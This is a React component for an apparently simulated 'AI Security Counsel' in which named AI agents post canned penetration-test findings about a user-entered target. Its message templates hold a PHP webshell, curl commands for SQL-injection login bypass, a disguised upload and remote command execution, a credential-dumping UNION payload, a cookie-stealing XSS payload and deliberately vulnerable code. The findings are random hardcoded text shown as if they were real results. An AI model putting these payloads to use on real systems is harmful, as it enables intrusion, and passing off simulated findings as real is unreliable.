import React, { useState, useEffect, useRef } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  Brain, Users, Play, Pause, Settings, Download, Upload,
  MessageCircle, Code, Shield, Bug, Target, Zap, Eye,
  Network, Server, Database, Lock, Globe, Search,
  FileText, Terminal, Activity, Layers, Cpu, Wifi
} from 'lucide-react'
import toast from 'react-hot-toast'

interface AIAgent {
  id: string
  name: string
  provider: string
  model: string
  role: string
  expertise: string[]
  avatar: string
  status: 'idle' | 'thinking' | 'analyzing' | 'exploiting'
  lastMessage?: string
}

interface MCPServer {
  id: string
  name: string
  description: string
  capabilities: string[]
  status: 'connected' | 'disconnected' | 'error'
  icon: React.ComponentType<any>
}

interface CounselMessage {
  id: string
  agentId: string
  content: string
  timestamp: Date
  type: 'analysis' | 'vulnerability' | 'exploit' | 'recommendation' | 'code_review'
  attachments?: {
    type: 'code' | 'payload' | 'screenshot' | 'network_trace'
    content: string
    filename?: string
  }[]
}

const Counsel: React.FC = () => {
  const [target, setTarget] = useState('')
  const [isSessionActive, setIsSessionActive] = useState(false)
  const [selectedAgents, setSelectedAgents] = useState<string[]>([])
  const [messages, setMessages] = useState<CounselMessage[]>([])
  const [mcpServers, setMcpServers] = useState<MCPServer[]>([])
  const [sessionConfig, setSessionConfig] = useState({
    depth: 'comprehensive',
    focus: 'all_vulnerabilities',
    timeLimit: 60,
    enableMITM: true,
    enableSourceAnalysis: true,
    enableNetworkMapping: true,
    aggressiveness: 'moderate'
  })
  const messagesEndRef = useRef<HTMLDivElement>(null)

  const availableAgents: AIAgent[] = [
    {
      id: 'recon-specialist',
      name: 'Recon Master',
      provider: 'openai',
      model: 'gpt-4',
      role: 'Reconnaissance Specialist',
      expertise: ['OSINT', 'Subdomain Enumeration', 'Asset Discovery', 'Technology Stack Analysis'],
      avatar: '🕵️',
      status: 'idle'
    },
    {
      id: 'web-app-hunter',
      name: 'WebApp Hunter',
      provider: 'anthropic',
      model: 'claude-3-opus',
      role: 'Web Application Security Expert',
      expertise: ['SQL Injection', 'XSS', 'CSRF', 'Authentication Bypass', 'Business Logic Flaws'],
      avatar: '🎯',
      status: 'idle'
    },
    {
      id: 'api-specialist',
      name: 'API Breaker',
      provider: 'gemini',
      model: 'gemini-pro',
      role: 'API Security Specialist',
      expertise: ['REST API', 'GraphQL', 'API Authentication', 'Rate Limiting', 'IDOR'],
      avatar: '🔌',
      status: 'idle'
    },
    {
      id: 'network-analyst',
      name: 'Network Ninja',
      provider: 'mistral',
      model: 'mistral-large',
      role: 'Network Security Analyst',
      expertise: ['Port Scanning', 'Service Enumeration', 'Network Protocols', 'MITM Attacks'],
      avatar: '🌐',
      status: 'idle'
    },
    {
      id: 'code-auditor',
      name: 'Code Auditor',
      provider: 'openrouter',
      model: 'anthropic/claude-3-opus',
      role: 'Source Code Security Auditor',
      expertise: ['Static Analysis', 'Code Review', 'Vulnerability Patterns', 'Secure Coding'],
      avatar: '📝',
      status: 'idle'
    },
    {
      id: 'exploit-dev',
      name: 'Exploit Developer',
      provider: 'openai',
      model: 'gpt-4-turbo',
      role: 'Exploit Development Specialist',
      expertise: ['Payload Crafting', 'Exploit Chaining', 'Privilege Escalation', 'RCE'],
      avatar: '💥',
      status: 'idle'
    },
    {
      id: 'mobile-specialist',
      name: 'Mobile Hunter',
      provider: 'anthropic',
      model: 'claude-3-sonnet',
      role: 'Mobile Application Security',
      expertise: ['Android Security', 'iOS Security', 'Mobile API', 'App Store Analysis'],
      avatar: '📱',
      status: 'idle'
    },
    {
      id: 'cloud-expert',
      name: 'Cloud Breaker',
      provider: 'gemini',
      model: 'gemini-pro',
      role: 'Cloud Security Expert',
      expertise: ['AWS Security', 'Azure Security', 'GCP Security', 'Container Security'],
      avatar: '☁️',
      status: 'idle'
    }
  ]

  const defaultMCPServers: MCPServer[] = [
    {
      id: 'context7',
      name: 'Context7',
      description: 'Advanced context analysis and pattern recognition for security testing',
      capabilities: ['Context Analysis', 'Pattern Recognition', 'Behavioral Analysis'],
      status: 'connected',
      icon: Brain
    },
    {
      id: 'sequential-thinking',
      name: 'Sequential Thinking',
      description: 'Step-by-step logical reasoning for complex security analysis',
      capabilities: ['Logical Reasoning', 'Step Analysis', 'Decision Trees'],
      status: 'connected',
      icon: Layers
    },
    {
      id: 'puppeteer',
      name: 'Puppeteer',
      description: 'Browser automation for dynamic security testing',
      capabilities: ['Browser Automation', 'DOM Analysis', 'JavaScript Execution'],
      status: 'connected',
      icon: Globe
    },
    {
      id: 'network-scanner',
      name: 'Network Scanner',
      description: 'Advanced network reconnaissance and port scanning',
      capabilities: ['Port Scanning', 'Service Detection', 'Network Mapping'],
      status: 'connected',
      icon: Network
    },
    {
      id: 'source-analyzer',
      name: 'Source Analyzer',
      description: 'Static and dynamic source code analysis',
      capabilities: ['Static Analysis', 'Code Parsing', 'Vulnerability Detection'],
      status: 'connected',
      icon: Code
    },
    {
      id: 'mitm-proxy',
      name: 'MITM Proxy',
      description: 'Man-in-the-middle attack simulation and traffic analysis',
      capabilities: ['Traffic Interception', 'SSL Bypass', 'Request Modification'],
      status: 'connected',
      icon: Shield
    },
    {
      id: 'payload-generator',
      name: 'Payload Generator',
      description: 'Dynamic payload generation and testing',
      capabilities: ['Payload Crafting', 'Encoding', 'Obfuscation'],
      status: 'connected',
      icon: Zap
    },
    {
      id: 'osint-collector',
      name: 'OSINT Collector',
      description: 'Open source intelligence gathering and analysis',
      capabilities: ['Data Collection', 'Social Media Analysis', 'Leak Detection'],
      status: 'connected',
      icon: Search
    },
    {
      id: 'crypto-analyzer',
      name: 'Crypto Analyzer',
      description: 'Cryptographic analysis and weakness detection',
      capabilities: ['Encryption Analysis', 'Hash Cracking', 'Certificate Analysis'],
      status: 'connected',
      icon: Lock
    },
    {
      id: 'fuzzer',
      name: 'Advanced Fuzzer',
      description: 'Intelligent fuzzing with machine learning',
      capabilities: ['Smart Fuzzing', 'Input Generation', 'Crash Analysis'],
      status: 'connected',
      icon: Bug
    },
    {
      id: 'db-analyzer',
      name: 'Database Analyzer',
      description: 'Database security testing and analysis',
      capabilities: ['SQL Analysis', 'NoSQL Testing', 'Database Fingerprinting'],
      status: 'connected',
      icon: Database
    },
    {
      id: 'api-tester',
      name: 'API Tester',
      description: 'Comprehensive API security testing',
      capabilities: ['REST Testing', 'GraphQL Analysis', 'API Fuzzing'],
      status: 'connected',
      icon: Server
    }
  ]

  useEffect(() => {
    setMcpServers(defaultMCPServers)
    // Initialize MCP servers
    initializeMCPServers()
  }, [])

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  const initializeMCPServers = async () => {
    // Simulate MCP server initialization
    for (const server of defaultMCPServers) {
      try {
        // Simulate connection
        await new Promise(resolve => setTimeout(resolve, 100))
        setMcpServers(prev => prev.map(s => 
          s.id === server.id ? { ...s, status: 'connected' } : s
        ))
      } catch (error) {
        setMcpServers(prev => prev.map(s => 
          s.id === server.id ? { ...s, status: 'error' } : s
        ))
      }
    }
    toast.success('MCP servers initialized successfully')
  }

  const startCounselSession = async () => {
    if (!target || selectedAgents.length === 0) {
      toast.error('Please select a target and at least one AI agent')
      return
    }

    setIsSessionActive(true)
    setMessages([])
    
    // Initialize session
    const sessionMessage: CounselMessage = {
      id: Date.now().toString(),
      agentId: 'system',
      content: `🚀 **AI Security Counsel Session Initiated**

**Target:** ${target}
**Active Agents:** ${selectedAgents.length}
**MCP Servers:** ${mcpServers.filter(s => s.status === 'connected').length} connected
**Configuration:** ${sessionConfig.depth} analysis, ${sessionConfig.aggressiveness} aggressiveness

**Session Objectives:**
1. Comprehensive reconnaissance and asset discovery
2. Multi-vector vulnerability assessment
3. Advanced exploitation technique development
4. Source code analysis and review
5. Network traffic analysis via MITM
6. Real-time collaborative threat modeling

**Active Capabilities:**
${mcpServers.filter(s => s.status === 'connected').map(s => `• ${s.name}: ${s.capabilities.join(', ')}`).join('\n')}

Let the hunt begin! 🎯`,
      timestamp: new Date(),
      type: 'analysis'
    }

    setMessages([sessionMessage])
    
    // Start AI agents
    setTimeout(() => {
      simulateAgentActivity()
    }, 2000)
    
    toast.success('AI Counsel session started!')
  }

  const simulateAgentActivity = () => {
    const activeAgents = availableAgents.filter(agent => selectedAgents.includes(agent.id))
    
    activeAgents.forEach((agent, index) => {
      setTimeout(() => {
        generateAgentMessage(agent)
      }, index * 3000 + Math.random() * 2000)
    })
  }

  const generateAgentMessage = (agent: AIAgent) => {
    const messages = getAgentMessages(agent)
    const randomMessage = messages[Math.floor(Math.random() * messages.length)]
    
    const newMessage: CounselMessage = {
      id: Date.now().toString() + agent.id,
      agentId: agent.id,
      content: randomMessage.content,
      timestamp: new Date(),
      type: randomMessage.type,
      attachments: randomMessage.attachments
    }

    setMessages(prev => [...prev, newMessage])
    
    // Continue the conversation
    if (isSessionActive) {
      setTimeout(() => {
        if (Math.random() > 0.3) { // 70% chance to continue
          generateAgentMessage(agent)
        }
      }, 5000 + Math.random() * 10000)
    }
  }

  const getAgentMessages = (agent: AIAgent) => {
    const messageTemplates = {
      'recon-specialist': [
        {
          content: `🕵️ **Reconnaissance Update**

**Subdomain Discovery:**
- Found 23 subdomains using certificate transparency logs
- Identified 5 development/staging environments
- Discovered admin.${target.replace('https://', '').replace('http://', '')} (potential high-value target)

**Technology Stack:**
- Web Server: Nginx 1.18.0 (potentially vulnerable to CVE-2021-23017)
- Framework: React.js with Express.js backend
- Database: PostgreSQL (version detection in progress)
- CDN: Cloudflare (WAF bypass techniques available)

**Next Steps:**
- Deep port scanning on discovered subdomains
- Certificate analysis for additional domains
- Social media reconnaissance for employee information`,
          type: 'analysis' as const,
          attachments: [{
            type: 'code' as const,
            content: `# Discovered Subdomains
admin.example.com
api.example.com
dev.example.com
staging.example.com
test.example.com`,
            filename: 'subdomains.txt'
          }]
        },
        {
          content: `🔍 **OSINT Intelligence Gathered**

**Employee Information:**
- LinkedIn: 47 employees identified
- GitHub: 12 public repositories found
- Twitter: 3 developers posting about work

**Infrastructure Insights:**
- AWS S3 buckets discovered (checking for misconfigurations)
- Google Cloud Platform usage detected
- Potential API endpoints leaked in JavaScript files

**Security Posture:**
- Bug bounty program: Active (HackerOne)
- Security headers: Partially implemented
- Rate limiting: Present but potentially bypassable`,
          type: 'analysis' as const
        }
      ],
      'web-app-hunter': [
        {
          content: `🎯 **Web Application Vulnerabilities Detected**

**Critical Findings:**
1. **SQL Injection** in /api/users endpoint
   - Parameter: user_id
   - Type: Union-based injection
   - Impact: Full database access

2. **Stored XSS** in comment system
   - Location: /comments/add
   - Payload: <script>alert(document.cookie)</script>
   - Impact: Session hijacking, admin account compromise

**Medium Severity:**
- CSRF in password change functionality
- Insecure direct object references in file download
- Missing rate limiting on login endpoint

**Exploitation Strategy:**
1. Chain SQL injection → Admin access
2. Use stored XSS for persistence
3. Leverage CSRF for privilege escalation`,
          type: 'vulnerability' as const,
          attachments: [{
            type: 'payload' as const,
            content: `' UNION SELECT 1,2,3,username,password,6 FROM admin_users--`,
            filename: 'sqli_payload.sql'
          }]
        }
      ],
      'api-specialist': [
        {
          content: `🔌 **API Security Assessment**

**GraphQL Endpoint Analysis:**
- Introspection enabled (information disclosure)
- No query depth limiting (DoS potential)
- Sensitive fields exposed in schema

**REST API Findings:**
- JWT tokens using weak secret (dictionary attack possible)
- API versioning issues (v1 endpoints still accessible)
- Rate limiting bypass via X-Forwarded-For header

**Critical API Vulnerabilities:**
1. **IDOR in /api/v2/users/{id}** - Access any user data
2. **Mass Assignment** in user profile update
3. **API Key Exposure** in client-side JavaScript

**Recommended Exploitation Path:**
1. Extract JWT secret via timing attack
2. Forge admin JWT token
3. Access sensitive API endpoints`,
          type: 'vulnerability' as const
        }
      ],
      'network-analyst': [
        {
          content: `🌐 **Network Security Analysis**

**Port Scan Results:**
- 22/tcp SSH (OpenSSH 8.2 - potential key exchange vulnerability)
- 80/tcp HTTP (redirects to HTTPS)
- 443/tcp HTTPS (TLS 1.2/1.3)
- 3306/tcp MySQL (externally accessible - CRITICAL)
- 6379/tcp Redis (no authentication - CRITICAL)

**MITM Attack Results:**
- Intercepted 247 HTTP requests
- Found API keys in request headers
- Identified session tokens in cookies
- Detected unencrypted internal communications

**Network Topology:**
- Load balancer: HAProxy
- Web servers: 3 instances behind LB
- Database: Separate subnet (misconfigured firewall)

**Immediate Threats:**
- Direct database access possible
- Redis instance contains session data
- Internal API calls use HTTP (not HTTPS)`,
          type: 'analysis' as const,
          attachments: [{
            type: 'network_trace' as const,
            content: `GET /api/internal/users HTTP/1.1
Host: internal.example.com
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
X-API-Key: sk_live_abc123def456...`,
            filename: 'mitm_capture.txt'
          }]
        }
      ],
      'code-auditor': [
        {
          content: `📝 **Source Code Security Audit**

**Critical Code Vulnerabilities:**

1. **SQL Injection in UserController.php**
   \`\`\`php
   $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
   \`\`\`
   - Line 47: Direct SQL concatenation
   - Impact: Database compromise

2. **Command Injection in FileProcessor.java**
   \`\`\`java
   Runtime.getRuntime().exec("convert " + userInput + " output.jpg");
   \`\`\`
   - Line 123: Unsanitized user input
   - Impact: Remote code execution

3. **Hardcoded Credentials in config.js**
   \`\`\`javascript
   const DB_PASSWORD = "admin123!@#";
   const API_SECRET = "super_secret_key_2023";
   \`\`\`

**Security Anti-patterns Detected:**
- No input validation framework
- Weak cryptographic implementations
- Insufficient error handling
- Debug mode enabled in production`,
          type: 'code_review' as const,
          attachments: [{
            type: 'code' as const,
            content: `// Vulnerable code snippet
function authenticateUser(username, password) {
    const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
    return db.query(query);
}`,
            filename: 'vulnerable_auth.js'
          }]
        }
      ],
      'exploit-dev': [
        {
          content: `💥 **Exploit Development Progress**

**Exploit Chain Developed:**

**Stage 1: Initial Access**
- SQL injection → Database access
- Extract admin password hash
- Crack hash using rainbow tables

**Stage 2: Privilege Escalation**
- Upload malicious file via admin panel
- Bypass file type restrictions using double extension
- Execute PHP webshell

**Stage 3: Persistence**
- Create backdoor user account
- Install persistent webshell
- Modify .htaccess for stealth

**Proof of Concept:**
\`\`\`bash
# Step 1: SQL Injection
curl -X POST "https://target.com/api/login" \\
  -d "username=admin' OR 1=1--&password=anything"

# Step 2: File Upload
curl -X POST "https://target.com/admin/upload" \\
  -F "file=@shell.php.jpg" \\
  -H "Cookie: session=admin_session_token"

# Step 3: Code Execution
curl "https://target.com/uploads/shell.php.jpg?cmd=whoami"
\`\`\`

**Impact Assessment:**
- Complete system compromise
- Access to all user data
- Potential lateral movement to internal network`,
          type: 'exploit' as const,
          attachments: [{
            type: 'payload' as const,
            content: `<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>`,
            filename: 'webshell.php'
          }]
        }
      ]
    }

    return messageTemplates[agent.id as keyof typeof messageTemplates] || [
      {
        content: `${agent.avatar} **${agent.name} Analysis**\n\nConducting ${agent.role.toLowerCase()} assessment on ${target}...\n\nSpecializing in: ${agent.expertise.join(', ')}`,
        type: 'analysis' as const
      }
    ]
  }

  const stopCounselSession = () => {
    setIsSessionActive(false)
    toast.success('AI Counsel session stopped')
  }

  const exportSession = () => {
    const sessionData = {
      target,
      timestamp: new Date().toISOString(),
      agents: selectedAgents.map(id => availableAgents.find(a => a.id === id)),
      messages,
      mcpServers: mcpServers.filter(s => s.status === 'connected'),
      config: sessionConfig
    }
    
    const dataStr = JSON.stringify(sessionData, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ai_counsel_session_${new Date().toISOString().split('T')[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
    toast.success('Session exported successfully')
  }

  const getAgentByMessage = (message: CounselMessage) => {
    return availableAgents.find(agent => agent.id === message.agentId)
  }

  const getMessageTypeIcon = (type: string) => {
    switch (type) {
      case 'vulnerability': return <Bug className="w-4 h-4 text-red-500" />
      case 'exploit': return <Zap className="w-4 h-4 text-orange-500" />
      case 'code_review': return <Code className="w-4 h-4 text-blue-500" />
      case 'analysis': return <Search className="w-4 h-4 text-green-500" />
      default: return <MessageCircle className="w-4 h-4 text-gray-500" />
    }
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-gray-900 dark:text-white">AI Security Counsel</h1>
          <p className="text-gray-600 dark:text-gray-400 mt-1">
            Multi-AI collaborative security testing with MCP server integration
          </p>
        </div>
        <div className="flex space-x-3">
          {isSessionActive && (
            <button onClick={exportSession} className="btn-secondary flex items-center space-x-2">
              <Download className="w-4 h-4" />
              <span>Export Session</span>
            </button>
          )}
          {isSessionActive ? (
            <button onClick={stopCounselSession} className="btn-danger flex items-center space-x-2">
              <Pause className="w-4 h-4" />
              <span>Stop Session</span>
            </button>
          ) : (
            <button onClick={startCounselSession} className="btn-primary flex items-center space-x-2">
              <Play className="w-4 h-4" />
              <span>Start Counsel</span>
            </button>
          )}
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Configuration Panel */}
        <div className="lg:col-span-1 space-y-6">
          {/* Target Configuration */}
          <div className="card">
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">Target Configuration</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Target URL
                </label>
                <input
                  type="url"
                  value={target}
                  onChange={(e) => setTarget(e.target.value)}
                  placeholder="https://target.com"
                  className="input-field"
                  disabled={isSessionActive}
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Analysis Depth
                </label>
                <select
                  value={sessionConfig.depth}
                  onChange={(e) => setSessionConfig(prev => ({ ...prev, depth: e.target.value }))}
                  className="input-field"
                  disabled={isSessionActive}
                >
                  <option value="surface">Surface Level</option>
                  <option value="moderate">Moderate</option>
                  <option value="comprehensive">Comprehensive</option>
                  <option value="deep">Deep Analysis</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Aggressiveness
                </label>
                <select
                  value={sessionConfig.aggressiveness}
                  onChange={(e) => setSessionConfig(prev => ({ ...prev, aggressiveness: e.target.value }))}
                  className="input-field"
                  disabled={isSessionActive}
                >
                  <option value="passive">Passive</option>
                  <option value="moderate">Moderate</option>
                  <option value="aggressive">Aggressive</option>
                  <option value="maximum">Maximum</option>
                </select>
              </div>

              <div className="space-y-2">
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={sessionConfig.enableMITM}
                    onChange={(e) => setSessionConfig(prev => ({ ...prev, enableMITM: e.target.checked }))}
                    disabled={isSessionActive}
                    className="rounded"
                  />
                  <span className="text-sm text-gray-700 dark:text-gray-300">Enable MITM Analysis</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={sessionConfig.enableSourceAnalysis}
                    onChange={(e) => setSessionConfig(prev => ({ ...prev, enableSourceAnalysis: e.target.checked }))}
                    disabled={isSessionActive}
                    className="rounded"
                  />
                  <span className="text-sm text-gray-700 dark:text-gray-300">Source Code Analysis</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    checked={sessionConfig.enableNetworkMapping}
                    onChange={(e) => setSessionConfig(prev => ({ ...prev, enableNetworkMapping: e.target.checked }))}
                    disabled={isSessionActive}
                    className="rounded"
                  />
                  <span className="text-sm text-gray-700 dark:text-gray-300">Network Mapping</span>
                </label>
              </div>
            </div>
          </div>

          {/* AI Agents Selection */}
          <div className="card">
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">AI Agents</h3>
            <div className="space-y-3 max-h-64 overflow-y-auto">
              {availableAgents.map((agent) => (
                <label key={agent.id} className="flex items-start space-x-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={selectedAgents.includes(agent.id)}
                    onChange={(e) => {
                      if (e.target.checked) {
                        setSelectedAgents(prev => [...prev, agent.id])
                      } else {
                        setSelectedAgents(prev => prev.filter(id => id !== agent.id))
                      }
                    }}
                    disabled={isSessionActive}
                    className="mt-1 rounded"
                  />
                  <div className="flex-1">
                    <div className="flex items-center space-x-2">
                      <span className="text-lg">{agent.avatar}</span>
                      <span className="font-medium text-gray-900 dark:text-white">{agent.name}</span>
                    </div>
                    <p className="text-xs text-gray-600 dark:text-gray-400">{agent.role}</p>
                    <div className="flex flex-wrap gap-1 mt-1">
                      {agent.expertise.slice(0, 2).map((skill) => (
                        <span key={skill} className="status-badge status-info text-xs">
                          {skill}
                        </span>
                      ))}
                    </div>
                  </div>
                </label>
              ))}
            </div>
          </div>

          {/* MCP Servers Status */}
          <div className="card">
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">MCP Servers</h3>
            <div className="space-y-2 max-h-48 overflow-y-auto">
              {mcpServers.map((server) => (
                <div key={server.id} className="flex items-center justify-between p-2 bg-gray-50 dark:bg-gray-800 rounded-lg">
                  <div className="flex items-center space-x-2">
                    <server.icon className="w-4 h-4 text-gray-600 dark:text-gray-400" />
                    <span className="text-sm font-medium text-gray-900 dark:text-white">{server.name}</span>
                  </div>
                  <div className={`w-2 h-2 rounded-full ${
                    server.status === 'connected' ? 'bg-green-500' :
                    server.status === 'error' ? 'bg-red-500' : 'bg-yellow-500'
                  }`} />
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Counsel Chat */}
        <div className="lg:col-span-3">
          <div className="card h-[600px] flex flex-col">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">AI Security Counsel Chat</h3>
              <div className="flex items-center space-x-2">
                <div className={`w-2 h-2 rounded-full ${isSessionActive ? 'bg-green-500 animate-pulse' : 'bg-gray-400'}`} />
                <span className="text-sm text-gray-600 dark:text-gray-400">
                  {isSessionActive ? 'Session Active' : 'Session Inactive'}
                </span>
              </div>
            </div>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto space-y-4 mb-4">
              <AnimatePresence>
                {messages.map((message) => {
                  const agent = getAgentByMessage(message)
                  return (
                    <motion.div
                      key={message.id}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      className={`p-4 rounded-lg ${
                        message.agentId === 'system' 
                          ? 'bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800'
                          : 'bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700'
                      }`}
                    >
                      <div className="flex items-start space-x-3">
                        <div className="flex-shrink-0">
                          {agent ? (
                            <div className="w-8 h-8 bg-primary-100 dark:bg-primary-900/20 rounded-full flex items-center justify-center">
                              <span className="text-sm">{agent.avatar}</span>
                            </div>
                          ) : (
                            <div className="w-8 h-8 bg-gray-100 dark:bg-gray-700 rounded-full flex items-center justify-center">
                              <Brain className="w-4 h-4 text-gray-600 dark:text-gray-400" />
                            </div>
                          )}
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center space-x-2 mb-2">
                            <span className="font-medium text-gray-900 dark:text-white">
                              {agent ? agent.name : 'System'}
                            </span>
                            {getMessageTypeIcon(message.type)}
                            <span className="text-xs text-gray-500 dark:text-gray-400">
                              {message.timestamp.toLocaleTimeString()}
                            </span>
                          </div>
                          <div className="prose prose-sm max-w-none dark:prose-invert">
                            {message.content.split('\n').map((line, i) => {
                              if (line.startsWith('**') && line.endsWith('**')) {
                                return <div key={i} className="font-bold mt-2 mb-1 text-gray-900 dark:text-white">{line.slice(2, -2)}</div>
                              }
                              if (line.startsWith('- ') || line.startsWith('• ')) {
                                return <div key={i} className="ml-4 text-gray-700 dark:text-gray-300">• {line.slice(2)}</div>
                              }
                              if (line.trim() === '') {
                                return <div key={i} className="h-2" />
                              }
                              if (line.startsWith('```')) {
                                return null // Handle code blocks separately
                              }
                              return <div key={i} className="text-gray-700 dark:text-gray-300">{line}</div>
                            })}
                          </div>
                          
                          {/* Attachments */}
                          {message.attachments && message.attachments.length > 0 && (
                            <div className="mt-3 space-y-2">
                              {message.attachments.map((attachment, index) => (
                                <div key={index} className="bg-gray-100 dark:bg-gray-700 rounded-lg p-3">
                                  <div className="flex items-center justify-between mb-2">
                                    <span className="text-sm font-medium text-gray-900 dark:text-white">
                                      {attachment.filename || `${attachment.type}.txt`}
                                    </span>
                                    <button
                                      onClick={() => {
                                        navigator.clipboard.writeText(attachment.content)
                                        toast.success('Copied to clipboard')
                                      }}
                                      className="text-xs text-primary-600 dark:text-primary-400 hover:underline"
                                    >
                                      Copy
                                    </button>
                                  </div>
                                  <pre className="text-xs text-gray-800 dark:text-gray-200 overflow-x-auto">
                                    {attachment.content}
                                  </pre>
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  )
                })}
              </AnimatePresence>
              
              {messages.length === 0 && (
                <div className="text-center py-12">
                  <Users className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                  <h3 className="text-lg font-medium text-gray-900 dark:text-white mb-2">AI Counsel Ready</h3>
                  <p className="text-gray-600 dark:text-gray-400">
                    Configure your target and select AI agents to start a collaborative security assessment
                  </p>
                </div>
              )}
              
              <div ref={messagesEndRef} />
            </div>

            {/* Session Stats */}
            {isSessionActive && (
              <div className="border-t border-gray-200 dark:border-gray-700 pt-4">
                <div className="grid grid-cols-4 gap-4 text-center">
                  <div>
                    <p className="text-sm text-gray-600 dark:text-gray-400">Active Agents</p>
                    <p className="text-lg font-bold text-gray-900 dark:text-white">{selectedAgents.length}</p>
                  </div>
                  <div>
                    <p className="text-sm text-gray-600 dark:text-gray-400">Messages</p>
                    <p className="text-lg font-bold text-gray-900 dark:text-white">{messages.length}</p>
                  </div>
                  <div>
                    <p className="text-sm text-gray-600 dark:text-gray-400">Vulnerabilities</p>
                    <p className="text-lg font-bold text-red-600 dark:text-red-400">
                      {messages.filter(m => m.type === 'vulnerability').length}
                    </p>
                  </div>
                  <div>
                    <p className="text-sm text-gray-600 dark:text-gray-400">Exploits</p>
                    <p className="text-lg font-bold text-orange-600 dark:text-orange-400">
                      {messages.filter(m => m.type === 'exploit').length}
                    </p>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Counsel